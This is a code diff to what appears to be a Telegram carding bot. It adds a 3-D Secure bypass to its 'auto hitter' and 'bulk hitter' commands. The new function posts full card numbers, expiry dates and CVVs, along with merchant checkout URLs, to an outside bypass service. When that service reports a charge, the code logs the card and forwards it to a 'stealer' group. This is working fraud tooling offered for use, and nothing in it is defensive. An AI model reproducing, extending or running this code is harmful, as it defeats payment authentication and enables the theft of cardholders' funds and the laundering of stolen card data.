@@ -14095,6 +14095,48 @@ async def gate_st1(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # AUTO HITTER COMMAND
 # ============================================================================
 
+async def _bypass_3ds_dotbypasser(card: dict, checkout_url: str, pk: str = "", proxy_url: str = None) -> dict:
+    """Attempt 3DS bypass via premium.dotbypasser.workers.dev.
+    Returns a result dict with at least 'status' and 'response' keys.
+    status is one of: CHARGED / DECLINED / FAILED / ERROR"""
+    BYPASS_API = "https://premium.dotbypasser.workers.dev/bypass"
+    payload = {
+        "cc":  card["cc"],
+        "mm":  str(card["month"]),
+        "yy":  str(card["year"])[-2:],
+        "cvv": card["cvv"],
+        "url": checkout_url,
+    }
+    if pk:
+        payload["pk"] = pk
+    try:
+        import aiohttp as _aio
+        timeout = _aio.ClientTimeout(total=30)
+        async with _aio.ClientSession(timeout=timeout) as sess:
+            req_kw = {"json": payload, "headers": {"Content-Type": "application/json"}}
+            if proxy_url:
+                req_kw["proxy"] = proxy_url
+            async with sess.post(BYPASS_API, **req_kw) as resp:
+                data = await resp.json(content_type=None)
+    except Exception as exc:
+        return {"status": "ERROR", "response": f"Bypass API error: {str(exc)[:60]}"}
+
+    if "error" in data and "limit" not in str(data["error"]).lower():
+        return {"status": "ERROR", "response": str(data["error"])[:80]}
+
+    raw_status = str(data.get("status", data.get("result", ""))).upper()
+    message    = str(data.get("response", data.get("message", data.get("msg", "Unknown"))))
+
+    if raw_status in ("CHARGED", "APPROVED", "SUCCESS", "LIVE", "CCN"):
+        return {"status": "CHARGED", "response": f"3DS Bypassed — {message}",
+                "success_url": data.get("success_url", ""), "decline_code": "N/A"}
+    if raw_status in ("DECLINED", "FAIL", "FAILED", "DEAD", "CVV", "INCORRECT_CVC"):
+        return {"status": "DECLINED", "response": f"[Bypass] {message}"}
+    if "3DS" in raw_status or raw_status in ("REQUIRES_ACTION", "3DS_REQUIRED"):
+        return {"status": "3DS_REQUIRED", "response": "3DS not bypassable"}
+    return {"status": "DECLINED", "response": f"[Bypass] {message}"}
+
+
 async def _run_auto_hit(update, context, url, cards, loading_msg):
     """Core hit runner — shared by auto_hitter_command and saved-BIN callback."""
     user = update.effective_user
@@ -14219,8 +14261,34 @@ async def _run_auto_hit(update, context, url, cards, loading_msg):
                 except:
                     pass
             elif status in ("3DS_REQUIRED", "3DS"):
-                card_statuses[i] = f"3DS Required {EMOJI['3ds']}"
-                results["3ds"].append(card_str)
+                card_statuses[i] = f"3DS → Bypassing... {EMOJI['3ds']}"
+                await _safe_edit(
+                    loading_msg,
+                    await _build_hit_status_text(merchant, price_str, success_url, cards, card_statuses, i, email=user_email, trial_info=trial_info),
+                    parse_mode=ParseMode.HTML, reply_markup=stop_keyboard
+                )
+                _bypass = await _bypass_3ds_dotbypasser(card, url, checkout_data.get("pk", ""), proxy_url)
+                _bstatus = _bypass.get("status", "ERROR")
+                if _bstatus == "CHARGED":
+                    card_statuses[i] = f"CHARGED (3DS Bypassed) {EMOJI['charged']}"
+                    results["charged"].append(card_str)
+                    try:
+                        from modules.bin_lookup import lookup_bin
+                        _bin_info = lookup_bin(card['cc'][:6])
+                    except:
+                        _bin_info = {}
+                    log_approved_card(user.id, user.username or user.first_name,
+                                      card['cc'], card['month'], card['year'], card['cvv'],
+                                      "auto_hitter_3ds_bypass", _bypass.get("response", ""), _bin_info)
+                    await send_to_stealer_group(context.bot, card['cc'], card['month'], card['year'], card['cvv'],
+                                                "auto_hitter_3ds_bypass", _bypass.get("response", ""), _bin_info,
+                                                user.id, user.username or user.first_name)
+                elif _bstatus == "DECLINED":
+                    card_statuses[i] = f"Declined {EMOJI['declined']} — {html.escape(_bypass.get('response','')[:50])}"
+                    results["declined"].append(card_str)
+                else:
+                    card_statuses[i] = f"3DS Required {EMOJI['3ds']}"
+                    results["3ds"].append(card_str)
             elif status == "DECLINED":
                 card_statuses[i] = f"Declined {EMOJI['declined']} — {response_text[:50]}"
                 results["declined"].append(card_str)
@@ -14574,8 +14642,31 @@ async def bulkhit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             live.append((raw_str, resp))
         elif status in ("3DS_REQUIRED", "3DS"):
             if idx >= 0:
-                card_statuses[idx] = f"3DS Required {EMOJI['3ds']}"
-            tds.append(raw_str)
+                card_statuses[idx] = f"3DS → Bypassing... {EMOJI['3ds']}"
+            _bcard = {"cc": cc, "month": month, "year": year, "cvv": cvv}
+            _bypass = await _bypass_3ds_dotbypasser(_bcard, checkout_url, checkout_data.get("pk", ""), proxy_url)
+            _bstatus = _bypass.get("status", "ERROR")
+            if _bstatus == "CHARGED":
+                if idx >= 0:
+                    card_statuses[idx] = f"CHARGED (3DS Bypassed) {EMOJI['charged']}"
+                charged.append((raw_str, _bypass.get("response", "3DS Bypassed")))
+                try:
+                    log_approved_card(user.id, user.username or user.first_name,
+                                      cc, month, year, cvv, "bulk_hitter_3ds_bypass",
+                                      _bypass.get("response", ""), {})
+                    await send_to_stealer_group(context.bot, cc, month, year, cvv,
+                                                "bulk_hitter_3ds_bypass", _bypass.get("response", ""),
+                                                {}, user.id, user.username or user.first_name)
+                except Exception:
+                    pass
+            elif _bstatus == "DECLINED":
+                if idx >= 0:
+                    card_statuses[idx] = f"Declined {EMOJI['declined']} — {html.escape(_bypass.get('response','')[:50])}"
+                declined.append((raw_str, _bypass.get("response", "")))
+            else:
+                if idx >= 0:
+                    card_statuses[idx] = f"3DS Required {EMOJI['3ds']}"
+                tds.append(raw_str)
         elif status == "DECLINED":
             if idx >= 0:
                 card_statuses[idx] = f"Declined {EMOJI['declined']} — {resp[:50]}"
